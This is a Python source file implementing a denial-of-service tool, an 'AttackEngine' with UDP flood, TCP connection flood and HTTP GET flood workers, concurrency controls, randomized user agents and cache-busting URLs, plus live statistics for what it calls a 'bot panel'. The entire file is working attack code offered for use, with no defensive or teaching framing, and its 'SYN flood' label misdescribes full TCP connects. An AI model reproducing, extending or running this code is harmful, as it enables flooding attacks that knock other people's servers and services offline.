import asyncio
import random
import time
import logging
from dataclasses import dataclass

logger = logging.getLogger("AttackEngine")


@dataclass
class AttackStats:
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    start_time: float = 0.0
    is_running: bool = False
    target: str = ""
    port: int = 0
    threads_active: int = 0
    max: int = 0
    method: str = "udp"


class AttackEngine:
    def __init__(self, max_requests: int, thread_count: int, timeout: int):
        self.max_requests = max_requests
        self.intensity = thread_count
        self.timeout = timeout
        self.stats = AttackStats()
        self.stats.max = max_requests
        self._stop_event = asyncio.Event()

    def get_status(self):
        """Live stats for bot panel"""
        duration = time.time() - self.stats.start_time if self.stats.start_time else 0
        rps = self.stats.total_requests / duration if duration > 0.1 else 0
        
        return {
            'running': self.stats.is_running,
            'target': self.stats.target,
            'port': self.stats.port,
            'method': self.stats.method.upper(),
            'progress': self.stats.total_requests,
            'max': self.stats.max,
            'successful': self.stats.successful,
            'failed': self.stats.failed,
            'rps': round(rps, 2),
            'duration': round(duration, 1),
            'threads_active': self.stats.threads_active
        }

    def stop_attack(self):
        """Stop attack immediately"""
        self.stats.is_running = False
        self.stats.threads_active = 0
        self._stop_event.set()

    def start_attack(self, target_ip: str, target_port: int, method: str = "auto"):
        """Start attack - auto-detects method based on port"""
        if self.stats.is_running:
            return False
        
        # Auto-detect method based on port
        if method == "auto":
            if target_port in [80, 8080, 443, 8443]:
                method = "http"
            elif target_port in [21, 22, 23, 25, 53, 110, 143, 443, 993, 995]:
                method = "tcp"
            else:
                method = "udp"
        
        self.stats.is_running = True
        self.stats.target = target_ip
        self.stats.port = target_port
        self.stats.method = method
        self.stats.start_time = time.time()
        self.stats.total_requests = 0
        self.stats.successful = 0
        self.stats.failed = 0
        self.stats.threads_active = self.intensity
        self._stop_event.clear()

        # Start attack in background
        asyncio.create_task(self._run_attack(target_ip, target_port, method))
        return True

    async def _run_attack(self, ip, port, method):
        """Run all workers based on method"""
        tasks = []
        
        for i in range(self.intensity):
            if method == "udp":
                tasks.append(self._udp_worker(ip, port))
            elif method == "tcp":
                tasks.append(self._tcp_worker(ip, port))
            elif method == "http":
                tasks.append(self._http_worker(ip, port))
        
        try:
            await asyncio.wait_for(asyncio.gather(*tasks), timeout=self.timeout)
        except asyncio.TimeoutError:
            logger.info("Attack timeout reached")
        except Exception as e:
            logger.error(f"Attack error: {e}")
        finally:
            self.stop_attack()

    async def _udp_worker(self, ip, port):
        """UDP Flood worker"""
        loop = asyncio.get_running_loop()
        try:
            transport, _ = await loop.create_datagram_endpoint(
                lambda: asyncio.DatagramProtocol(),
                remote_addr=(ip, port)
            )
            payload = random._urandom(1400)
            
            while self.stats.is_running and self.stats.total_requests < self.max_requests:
                try:
                    transport.sendto(payload)
                    self.stats.total_requests += 1
                    self.stats.successful += 1
                    await asyncio.sleep(0)
                except Exception:
                    self.stats.failed += 1
            
            transport.close()
        except Exception as e:
            logger.debug(f"UDP worker error: {e}")
            self.stats.failed += 1

    async def _tcp_worker(self, ip, port):
        """TCP SYN Flood worker"""
        while self.stats.is_running and self.stats.total_requests < self.max_requests:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port),
                    timeout=5
                )
                
                # Send SYN packet data
                writer.write(b"\x00" * 1024)
                await writer.drain()
                
                self.stats.total_requests += 1
                self.stats.successful += 1
                
                writer.close()
                await writer.wait_closed()
                
            except asyncio.TimeoutError:
                self.stats.failed += 1
            except Exception:
                self.stats.failed += 1
            
            await asyncio.sleep(0)

    async def _http_worker(self, ip, port):
        """HTTP GET Flood worker"""
        import aiohttp
        
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=50)
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            while self.stats.is_running and self.stats.total_requests < self.max_requests:
                try:
                    url = f"http://{ip}:{port}/?{random.randint(1, 999999)}"
                    headers = {
                        'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.randint(1, 999)}',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                    }
                    
                    async with session.get(url, headers=headers) as response:
                        self.stats.total_requests += 1
                        if response.status < 400:
                            self.stats.successful += 1
                        else:
                            self.stats.failed += 1
                            
                except Exception:
                    self.stats.total_requests += 1
                    self.stats.failed += 1
                
                await asyncio.sleep(0)
